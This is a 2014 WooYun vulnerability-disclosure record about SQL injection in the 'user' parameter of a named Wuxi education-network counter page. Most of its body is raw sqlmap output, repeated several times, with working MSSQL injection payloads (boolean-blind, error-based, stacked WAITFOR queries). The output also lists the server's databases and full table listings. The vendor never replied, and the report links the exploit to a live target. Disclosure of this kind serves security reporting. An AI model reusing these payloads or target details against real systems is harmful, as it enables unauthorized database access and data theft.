{"id": 54301, "wybug_id": "wooyun-2014-064913", "wybug_title": "某地区教育网sql注入一枚", "wybug_corp": "无锡教育网", "wybug_author": "追逐天堂", "wybug_date": "2014-06-14 18:49", "wybug_open_date": "2014-07-29 18:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-14：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-07-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：    闲来无事，友情检测。请勿见怪。涉及多个库表  详细说明：  \n注入地址：http://count.wxjy.com.cn/count//counter.asp?user=90years\n\n\n\n\n\n\n\n\n\n\n   漏洞证明：  sqlmap identified the following injection points with a total of 109 HTTP(s) requests:---Place: GETParameter: user    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user=90years' AND 8290=8290 AND 'FPCI'='FPCI    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: user=90years' AND 7964=CONVERT(INT,(SELECT CHAR(113)+CHAR(119)+CHAR(97)+CHAR(110)+CHAR(113)+(SELECT (CASE WHEN (7964=7964) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(100)+CHAR(121)+CHAR(116)+CHAR(113))) AND 'TAex'='TAex    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: user=90years'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: user=90years' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: user    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user=90years' AND 8290=8290 AND 'FPCI'='FPCI    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: user=90years' AND 7964=CONVERT(INT,(SELECT CHAR(113)+CHAR(119)+CHAR(97)+CHAR(110)+CHAR(113)+(SELECT (CASE WHEN (7964=7964) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(100)+CHAR(121)+CHAR(116)+CHAR(113))) AND 'TAex'='TAex    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: user=90years'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: user=90years' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000available databases [8]:[*] blog[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb[*] wxjy_countsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: user    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user=90years' AND 8290=8290 AND 'FPCI'='FPCI    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: user=90years' AND 7964=CONVERT(INT,(SELECT CHAR(113)+CHAR(119)+CHAR(97)+CHAR(110)+CHAR(113)+(SELECT (CASE WHEN (7964=7964) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(100)+CHAR(121)+CHAR(116)+CHAR(113))) AND 'TAex'='TAex    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: user=90years'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: user=90years' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000current user is DBA:    Falsesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: user    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user=90years' AND 8290=8290 AND 'FPCI'='FPCI    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: user=90years' AND 7964=CONVERT(INT,(SELECT CHAR(113)+CHAR(119)+CHAR(97)+CHAR(110)+CHAR(113)+(SELECT (CASE WHEN (7964=7964) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(100)+CHAR(121)+CHAR(116)+CHAR(113))) AND 'TAex'='TAex    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: user=90years'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: user=90years' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000current database:    'wxjy_count'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: user    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user=90years' AND 8290=8290 AND 'FPCI'='FPCI    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: user=90years' AND 7964=CONVERT(INT,(SELECT CHAR(113)+CHAR(119)+CHAR(97)+CHAR(110)+CHAR(113)+(SELECT (CASE WHEN (7964=7964) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(100)+CHAR(121)+CHAR(116)+CHAR(113))) AND 'TAex'='TAex    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: user=90years'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: user=90years' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000current user:    'wxjy_count'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: user    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user=90years' AND 8290=8290 AND 'FPCI'='FPCI    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: user=90years' AND 7964=CONVERT(INT,(SELECT CHAR(113)+CHAR(119)+CHAR(97)+CHAR(110)+CHAR(113)+(SELECT (CASE WHEN (7964=7964) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(100)+CHAR(121)+CHAR(116)+CHAR(113))) AND 'TAex'='TAex    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: user=90years'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: user=90years' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000Database: tempdb[2 tables]+--------------------------------------------+| sysconstraints                             || syssegments                                |+--------------------------------------------+Database: msdb[83 tables]+--------------------------------------------+| RTblClassDefs                              || RTblClassExtension                         || RTblDBMProps                               || RTblDBXProps                               || RTblDTMProps                               || RTblDTSProps                               || RTblDatabaseVersion                        || RTblEQMProps                               || RTblEnumerationDef                         || RTblEnumerationValueDef                    || RTblGENProps                               || RTblIfaceDefs                              || RTblIfaceHier                              || RTblIfaceMem                               || RTblMDSProps                               || RTblNamedObj                               || RTblOLPProps                               || RTblParameterDef                           || RTblPropDefs                               || RTblProps                                  || RTblRelColDefs                             || RTblRelshipDefs                            || RTblRelshipProps                           || RTblRelships                               || RTblSIMProps                               || RTblScriptDefs                             || RTblSites                                  || RTblSumInfo                                || RTblTFMProps                               || RTblTypeInfo                               || RTblTypeLibs                               || RTblUMLProps                               || RTblUMXProps                               || RTblVersionAdminInfo                       || RTblVersions                               || RTblWorkspaceItems                         || backupfile                                 || backupmediafamily                          || backupmediaset                             || backupset                                  || log_shipping_databases                     || log_shipping_monitor                       || log_shipping_plan_databases                || log_shipping_plan_history                  || log_shipping_plans                         || log_shipping_primaries                     || log_shipping_secondaries                   || logmarkhistory                             || mswebtasks                                 || restorefile                                || restorefilegroup                           || restorehistory                             || sqlagent_info                              || sysalerts                                  || syscachedcredentials                       || syscategories                              || sysconstraints                             || sysdbmaintplan_databases                   || sysdbmaintplan_history                     || sysdbmaintplan_jobs                        || sysdbmaintplans                            || sysdownloadlist                            || sysdtscategories                           || sysdtspackagelog                           || sysdtspackages                             || sysdtssteplog                              || sysdtstasklog                              || sysjobhistory                              || sysjobs                                    || sysjobs_view                               || sysjobschedules                            || sysjobservers                              || sysjobsteps                                || sysnotifications                           || sysoperators                               || syssegments                                || systargetservergroupmembers                || systargetservergroups                      || systargetservers                           || systargetservers_view                      || systaskids                                 || systasks                                   || systasks_view                              |+--------------------------------------------+Database: pubs[14 tables]+--------------------------------------------+| authors                                    || discounts                                  || employee                                   || jobs                                       || pub_info                                   || publishers                                 || roysched                                   || sales                                      || stores                                     || sysconstraints                             || syssegments                                || titleauthor                                || titles                                     || titleview                                  |+--------------------------------------------+Database: master[36 tables]+--------------------------------------------+| INFORMATION_SCHEMA.CHECK_CONSTRAINTS       || INFORMATION_SCHEMA.COLUMNS                 || INFORMATION_SCHEMA.COLUMN_DOMAIN_USAGE     || INFORMATION_SCHEMA.COLUMN_PRIVILEGES       || INFORMATION_SCHEMA.CONSTRAINT_COLUMN_USAGE || INFORMATION_SCHEMA.CONSTRAINT_TABLE_USAGE  || INFORMATION_SCHEMA.DOMAINS                 || INFORMATION_SCHEMA.DOMAIN_CONSTRAINTS      || INFORMATION_SCHEMA.KEY_COLUMN_USAGE        || INFORMATION_SCHEMA.PARAMETERS              || INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS || INFORMATION_SCHEMA.ROUTINES                || INFORMATION_SCHEMA.ROUTINE_COLUMNS         || INFORMATION_SCHEMA.SCHEMATA                || INFORMATION_SCHEMA.TABLES                  || INFORMATION_SCHEMA.TABLE_CONSTRAINTS       || INFORMATION_SCHEMA.TABLE_PRIVILEGES        || INFORMATION_SCHEMA.VIEWS                   || INFORMATION_SCHEMA.VIEW_COLUMN_USAGE       || INFORMATION_SCHEMA.VIEW_TABLE_USAGE        || MSreplication_options                      || spt_datatype_info                          || spt_datatype_info_ext                      || spt_fallback_db                            || spt_fallback_dev                           || spt_fallback_usg                           || spt_monitor                                || spt_provider_types                         || spt_server_info                            || spt_values                                 || sysconstraints                             || syslogins                                  || sysoledbusers                              || sysopentapes                               || sysremotelogins                            || syssegments                                |+--------------------------------------------+Database: wxjy_count[6 tables]+--------------------------------------------+| cnt_history                                || cnt_info                                   || cnt_msg                                    || dtproperties                               || sysconstraints                             || syssegments                                |+--------------------------------------------+Database: Northwind[31 tables]+--------------------------------------------+| Categories                                 || CustomerCustomerDemo                       || CustomerDemographics                       || Customers                                  || EmployeeTerritories                        || Employees                                  || Invoices                                   || Orders                                     || Products                                   || Region                                     || Shippers                                   || Suppliers                                  || Territories                                || Alphabetical list of products              || Category Sales for 1997                    || Current Product List                       || Customer and Suppliers by City             || Order Details Extended                     || Order Details                              || Order Subtotals                            || Orders Qry                                 || Product Sales for 1997                     || Products Above Average Price               || Products by Category                       || Quarterly Orders                           || Sales Totals by Amount                     || Sales by Category                          || Summary of Sales by Quarter                || Summary of Sales by Year                   || sysconstraints                             || syssegments                                |+--------------------------------------------+   修复方案：  你比我强。没有更进一步    版权声明：转载请注明来源 追逐天堂@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-06-14 20:32 |    \t\t老西 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 小人物)\t\t \n  @疯狗 这个不是应该交给cncert国家互联网应急中心吗    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}